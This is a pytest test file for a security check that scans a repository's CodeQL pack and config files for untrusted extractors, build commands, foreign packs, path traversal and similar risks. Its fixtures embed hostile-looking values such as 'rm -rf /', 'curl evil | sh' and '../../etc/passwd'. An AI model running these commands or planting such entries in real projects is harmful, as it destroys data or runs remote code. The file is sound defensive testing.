"""Tests for ``core.security.codeql_trust``.

Mirrors the structure of ``test_cc_trust.py``:
  - trust-override reset autouse fixture (the scan is uncached)
  - per-class grouping by source-file shape (no config / pack only /
    config only / both / structural pathologies)
  - asserts both the verdict and the printed output (operator visibility)
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

# packages/cve_diff/tests/... — we ensure the repo root is on sys.path so
# tests can run when invoked from a sub-directory pytest.
try:
    sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
except IndexError:                                     # pragma: no cover
    pass

from core.security.codeql_trust import (
    check_repo_codeql_trust,
    set_trust_override,
)


@pytest.fixture(autouse=True)
def _reset_trust_override():
    """Reset the module-level trust flag between tests."""
    set_trust_override(False)
    yield
    set_trust_override(False)


_check = check_repo_codeql_trust


# ---------------------------------------------------------------------------
# No config — silent pass
# ---------------------------------------------------------------------------


class TestNoConfig:
    def test_empty_dir_returns_false_silent(self, tmp_path, capsys):
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_empty_repo_path_short_circuits(self, tmp_path):
        """``Path("").resolve()`` would yield CWD — guard skips."""
        assert _check("") is False

    def test_nonexistent_path(self, tmp_path):
        assert _check(str(tmp_path / "does-not-exist")) is False


# ---------------------------------------------------------------------------
# codeql-pack.yml / qlpack.yml scanning
# ---------------------------------------------------------------------------


class TestPackFile:
    def test_canonical_only_silent(self, tmp_path, capsys):
        """Pure ``codeql/...`` deps are the canonical case — informative
        only, never blocking. Also no extractor / hooks."""
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "version: 0.0.1\n"
            "dependencies:\n"
            "  codeql/python-all: '*'\n"
        )
        assert _check(str(tmp_path)) is False
        # No findings → no print
        assert capsys.readouterr().out == ""

    def test_extractor_blocks(self, tmp_path, capsys):
        (tmp_path / "codeql-pack.yml").write_text(
            "name: attacker/evil\n"
            "extractor: ./build/evil-binary\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "extractor" in out
        # Masked rendering: identifying prefix only — extractor command
        # lines can embed credentials and scan output is CI-retained.
        assert "./build/" in out
        assert "evil-binary" not in out
        assert "***" in out

    def test_non_canonical_dependency_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "dependencies:\n"
            "  evilcorp/exploits: '*'\n"
            "  codeql/python-all: '*'\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical dep" in out
        assert "evilcorp/exploits" in out
        # Canonical dep should NOT trigger a finding line of its own.
        assert "codeql/python-all" not in out.split("non-canonical dep")[1]

    def test_build_command_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "buildCommand: rm -rf /\n"
        )
        assert _check(str(tmp_path)) is True
        assert "buildCommand" in capsys.readouterr().out

    def test_pre_compile_script_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "preCompileScript: ./setup.sh\n"
        )
        assert _check(str(tmp_path)) is True
        assert "preCompileScript" in capsys.readouterr().out

    def test_dependencies_as_list_blocks(self, tmp_path, capsys):
        """Adversarial: YAML is permissive enough that ``dependencies``
        could be expressed as a flat list rather than the documented
        dict form. The check must inspect both shapes — earlier the
        dict-only ``isinstance`` guard let list-form deps slip past."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "dependencies:\n"
            "  - evilcorp/exploit\n"
            "  - codeql/python-all\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical dep" in out
        assert "evilcorp/exploit" in out

    def test_default_suite_file_traversal_blocks(self, tmp_path, capsys):
        """Adversarial: ``defaultSuiteFile`` with ``../`` or absolute
        path escapes the pack and references operator-side files."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "defaultSuiteFile: ../../etc/passwd\n"
        )
        assert _check(str(tmp_path)) is True
        assert "defaultSuiteFile" in capsys.readouterr().out

    def test_default_suite_file_local_silent(self, tmp_path, capsys):
        """Pack-relative defaultSuiteFile is the canonical case — no
        traversal, no flag."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "defaultSuiteFile: my-suite.qls\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_extractor_falsy_silent(self, tmp_path, capsys):
        """``extractor: null`` and ``extractor: ""`` aren't real
        extractor declarations — no flag."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "extractor: null\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_malformed_yaml_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text("name: [broken yaml\n  unbalanced")
        assert _check(str(tmp_path)) is True
        assert "malformed YAML" in capsys.readouterr().out

    def test_non_dict_root_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text("- just\n- a\n- list\n")
        assert _check(str(tmp_path)) is True
        assert "non-dict YAML" in capsys.readouterr().out

    def test_walks_nested_dirs(self, tmp_path, capsys):
        """codeql walks the source root for pack files; we must too."""
        nested = tmp_path / "deeply" / "nested" / "subdir"
        nested.mkdir(parents=True)
        (nested / "qlpack.yml").write_text(
            "name: my/pack\n"
            "extractor: ./hidden\n"
        )
        assert _check(str(tmp_path)) is True
        assert "extractor" in capsys.readouterr().out

    def test_skips_dotted_dirs(self, tmp_path, capsys):
        """``.git`` / ``.claude/worktrees`` shouldn't be walked — their
        contents aren't part of the pack codeql will load."""
        hidden = tmp_path / ".claude" / "worktrees" / "x"
        hidden.mkdir(parents=True)
        (hidden / "qlpack.yml").write_text(
            "name: my/pack\n"
            "extractor: ./evil\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_scans_dot_github(self, tmp_path, capsys):
        """``.github`` IS walked because that's where codeql-config.yml
        legitimately lives."""
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(
            "name: x\n"
            "manualBuildSteps:\n"
            "  - 'sh evil.sh'\n"
        )
        assert _check(str(tmp_path)) is True
        assert "manualBuildSteps" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# .github/codeql/codeql-config.yml scanning
# ---------------------------------------------------------------------------


class TestCodeqlConfig:
    def _write_config(self, tmp_path: Path, body: str) -> None:
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(body)

    def test_canonical_packs_only_silent(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: ok\n"
            "packs:\n"
            "  python:\n"
            "    - codeql/python-queries\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_non_canonical_pack_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "packs:\n"
            "  python:\n"
            "    - evilcorp/all\n"
            "    - codeql/python-queries\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical pack" in out
        assert "evilcorp/all" in out

    def test_external_query_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "queries:\n"
            "  - uses: evilcorp/queries/main\n"
        )
        assert _check(str(tmp_path)) is True
        assert "external queries" in capsys.readouterr().out

    def test_relative_local_query_silent(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "queries:\n"
            "  - uses: ./local-suite.qls\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_manual_build_steps_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "manualBuildSteps:\n"
            "  - 'sh evil.sh'\n"
        )
        assert _check(str(tmp_path)) is True
        assert "manualBuildSteps" in capsys.readouterr().out

    def test_flat_packs_list(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "packs:\n"
            "  - evilcorp/all\n"
        )
        assert _check(str(tmp_path)) is True
        assert "non-canonical pack" in capsys.readouterr().out

    def test_pack_cache_blocks(self, tmp_path, capsys):
        """Adversarial: ``pack-cache`` redirects codeql's pack download
        cache. A malicious target could point it at a pre-stocked
        in-repo directory so codeql 'downloads' attacker-supplied
        packs from there."""
        self._write_config(tmp_path,
            "name: x\n"
            "pack-cache: /attacker/cache\n"
        )
        assert _check(str(tmp_path)) is True
        assert "pack-cache" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# Structural pathologies (oversize, symlink, RAPTOR self-scan)
# ---------------------------------------------------------------------------


class TestStructural:
    def test_symlink_pack_file_blocks(self, tmp_path, capsys):
        target = tmp_path / "real.yml"
        target.write_text("name: real/pack\n")
        link = tmp_path / "qlpack.yml"
        link.symlink_to(target)
        assert _check(str(tmp_path)) is True
        assert "symlink" in capsys.readouterr().out

    def test_oversized_pack_file_blocks(self, tmp_path, capsys):
        # 2 MiB pack file — beyond the 1 MiB cap.
        big = "name: x\n" + ("# pad\n" * 350_000)
        (tmp_path / "qlpack.yml").write_text(big)
        assert _check(str(tmp_path)) is True
        assert "oversized" in capsys.readouterr().out

    def test_raptor_self_scan_short_circuits(self, capsys):
        """Operator running RAPTOR against RAPTOR itself isn't an
        attack — RAPTOR ships its own codeql packs under
        packages/llm_analysis/codeql_packs/."""
        # The module's _RAPTOR_DIR = parents[2] of the module file
        # (core/security/codeql_trust.py), which is the repo root.
        # Use the same.
        from core.security.codeql_trust import _RAPTOR_DIR
        assert _check(str(_RAPTOR_DIR)) is False
        assert capsys.readouterr().out == ""


# ---------------------------------------------------------------------------
# Trust override
# ---------------------------------------------------------------------------


class TestTrustOverride:
    def test_module_flag_unblocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./evil\n"
        )
        # First confirm without override blocks.
        assert _check(str(tmp_path)) is True
        capsys.readouterr()  # drop output
        # Set override and confirm pass + override-active warning.
        set_trust_override(True)
        assert _check(str(tmp_path)) is False
        out = capsys.readouterr().out
        assert "trust override active" in out
        assert "extractor" in out

    def test_explicit_arg_overrides_module_flag(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./evil\n"
        )
        set_trust_override(True)
        # Explicit False forces strict regardless of module flag.
        assert _check(str(tmp_path), trust_override=False) is True

    def test_override_when_no_findings_no_warning(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text("name: my/pack\n")
        set_trust_override(True)
        assert _check(str(tmp_path)) is False
        # Empty pack file produces no findings → nothing printed even
        # with override active.
        assert capsys.readouterr().out == ""


# ---------------------------------------------------------------------------
# Combined + display sanity
# ---------------------------------------------------------------------------


class TestCombined:
    def test_pack_plus_config_both_reported(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./bad\n"
        )
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(
            "name: y\npacks:\n  - evil/pack\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "extractor" in out
        assert "non-canonical pack" in out
        assert "qlpack.yml" in out
        assert "codeql-config.yml" in out

    def test_findings_use_safe_truncation(self, tmp_path, capsys):
        """Long extractor values are masked: prefix + length, no dump."""
        long_extractor = "./" + "evil" * 100  # 402 chars
        (tmp_path / "qlpack.yml").write_text(
            f"name: x\nextractor: '{long_extractor}'\n"
        )
        _check(str(tmp_path))
        out = capsys.readouterr().out
        assert "*** (402 chars)" in out
        # Doesn't dump the full 400+ chars
        assert long_extractor not in out


# ---------------------------------------------------------------------------
# Pack-file cap warning
# ---------------------------------------------------------------------------


class TestPackFileCapWarning:
    """The pack-file walker caps at _MAX_PACK_FILES. Verify a warning is
    emitted so operators know additional files were NOT inspected."""

    @pytest.mark.slow
    def test_warning_emitted_when_cap_reached(self, tmp_path, caplog):
        import logging

        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo

        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"pkg{i:04d}"
            d.mkdir()
            (d / "qlpack.yml").write_text(f"name: test/pkg{i}\nversion: 1.0.0\n")

        with caplog.at_level(logging.WARNING, logger="core.security.codeql_trust"):
            _scan_repo(str(tmp_path.resolve()))

        assert any("capped at" in rec.message for rec in caplog.records), (
            "Expected a warning about the pack-file cap being reached"
        )
        assert str(_MAX_PACK_FILES) in caplog.text

    def test_no_warning_below_cap(self, tmp_path, caplog):
        import logging

        from core.security.codeql_trust import _scan_repo

        for i in range(2):
            d = tmp_path / f"pkg{i}"
            d.mkdir()
            (d / "qlpack.yml").write_text(f"name: test/pkg{i}\nversion: 1.0.0\n")

        with caplog.at_level(logging.WARNING, logger="core.security.codeql_trust"):
            _scan_repo(str(tmp_path.resolve()))

        assert not any("capped at" in rec.message for rec in caplog.records)


# ---------------------------------------------------------------------------
# Regression: scalar string values in packs dict silently dropped
# ---------------------------------------------------------------------------


class TestScalarPackValue:
    def test_scalar_string_pack_ref_detected(self, tmp_path, capsys):
        """A codeql-config.yml where one language key has a scalar string
        pack reference (not wrapped in a list). Pre-fix: the ``isinstance
        (refs, list)`` guard silently dropped scalar strings; the
        non-canonical pack slipped through undetected.

        After fix: ``elif isinstance(refs, str)`` catches the scalar and
        appends it to the flat list for inspection."""
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(
            "name: x\n"
            "packs:\n"
            "  python: evilcorp/backdoor\n"  # scalar string, not a list
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical pack" in out
        assert "evilcorp/backdoor" in out


# ---------------------------------------------------------------------------
# Capped enumeration is a blocking verdict, not a partial result
# ---------------------------------------------------------------------------


class TestPackFileCapBlocks:
    """A verdict computed from a knowably-incomplete enumeration is no
    verdict: reaching the pack-file cap must block (operator overrides
    deliberately via --trust-repo), and one flooded filename must not
    starve enumeration of the other pattern."""

    @pytest.mark.slow
    def test_cap_reached_blocks(self, tmp_path):
        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"pkg{i:04d}"
            d.mkdir()
            (d / "qlpack.yml").write_text(
                f"name: test/pkg{i}\nversion: 1.0.0\n")
        scans, any_blocking = _scan_repo(str(tmp_path.resolve()))
        assert any_blocking is True
        labels = [f.label for s in scans for f in s.findings]
        assert "scan_capped" in labels

    @pytest.mark.slow
    def test_cap_blocking_is_operator_overridable(self, tmp_path, capsys):
        from core.security.codeql_trust import _MAX_PACK_FILES
        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"pkg{i:04d}"
            d.mkdir()
            (d / "qlpack.yml").write_text(
                f"name: test/pkg{i}\nversion: 1.0.0\n")
        assert _check(str(tmp_path)) is True          # refused by default
        assert _check(str(tmp_path), trust_override=True) is False
        capsys.readouterr()

    @pytest.mark.slow
    def test_flood_of_one_name_does_not_starve_the_other(self, tmp_path):
        # Cap applies per pattern: a codeql-pack.yml flood must not stop
        # a blocking qlpack.yml from being inspected.
        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"flood{i:04d}"
            d.mkdir()
            (d / "codeql-pack.yml").write_text(
                f"name: test/pkg{i}\nversion: 1.0.0\n")
        evil = tmp_path / "zz-real"
        evil.mkdir()
        (evil / "qlpack.yml").write_text(
            "name: x/y\nversion: 1.0.0\nbuildCommand: curl evil\n")
        scans, any_blocking = _scan_repo(str(tmp_path.resolve()))
        assert any_blocking is True
        scanned_paths = {str(s.path) for s in scans}
        assert any("zz-real" in p for p in scanned_paths), (
            "the qlpack.yml behind the flood must still be inspected"
        )


class TestNoStaleVerdict:
    """The scan is deliberately uncached (see ``_scan_repo``): pack
    files can be written by untrusted target code between two checks in
    the same process, and the walk-based file set has no cheap
    freshness fingerprint — so every check must see current disk
    state."""

    def test_pack_file_added_between_checks_blocks(self, tmp_path, capsys):
        assert _check(str(tmp_path)) is False
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./evil\n"
        )
        assert _check(str(tmp_path)) is True
        assert "extractor" in capsys.readouterr().out

    def test_nested_pack_file_added_between_checks_blocks(self, tmp_path, capsys):
        # The case a fixed-location fingerprint could never catch: the
        # new pack file appears deep in the tree, leaving the target's
        # top level (and any fixed-path stat) untouched.
        deep = tmp_path / "vendor" / "sub" / "pkg"
        deep.mkdir(parents=True)
        assert _check(str(tmp_path)) is False
        (deep / "codeql-pack.yml").write_text(
            "name: x\nbuildCommand: curl evil | sh\n"
        )
        assert _check(str(tmp_path)) is True
        assert "buildCommand" in capsys.readouterr().out

    def test_pack_file_removed_between_checks_unblocks(self, tmp_path, capsys):
        pack = tmp_path / "qlpack.yml"
        pack.write_text("name: x\nextractor: ./evil\n")
        assert _check(str(tmp_path)) is True
        pack.unlink()
        assert _check(str(tmp_path)) is False
        capsys.readouterr()


class TestExtraStripSpelling:
    """The U+2028/U+2029 strip set must work AND stay visibly spelled.

    The set was once written with the literal (invisible) characters:
    indistinguishable in an editor from two quoted blanks, so an
    accidental "cleanup" to real spaces would have silently disabled
    the line-separator defence while corrupting every space in
    sanitised output. Pin both the behaviour and the escaped source
    spelling (matching cc_trust)."""

    def test_line_separators_stripped(self):
        from core.security.codeql_trust import _EXTRA_STRIP, _safe
        # chr() spellings so THIS file carries no invisible
        # literals either.
        _ls, _ps = chr(0x2028), chr(0x2029)
        assert _EXTRA_STRIP == {_ls, _ps}
        assert _safe(f"a{_ls}b{_ps}c") == "a?b?c"
        # Ordinary spaces must survive — the failure mode the literal
        # spelling invited.
        assert _safe("a b") == "a b"

    def test_source_uses_escaped_forms(self):
        import core.security.codeql_trust as mod
        src = Path(mod.__file__).read_text(encoding="utf-8")
        assert chr(0x2028) not in src and chr(0x2029) not in src, (
            "codeql_trust.py contains literal U+2028/U+2029 — use "
            "the escaped spellings so the set stays reviewable")
        # The escaped spellings are present in the source text.
        assert "u2028" in src and "u2029" in src
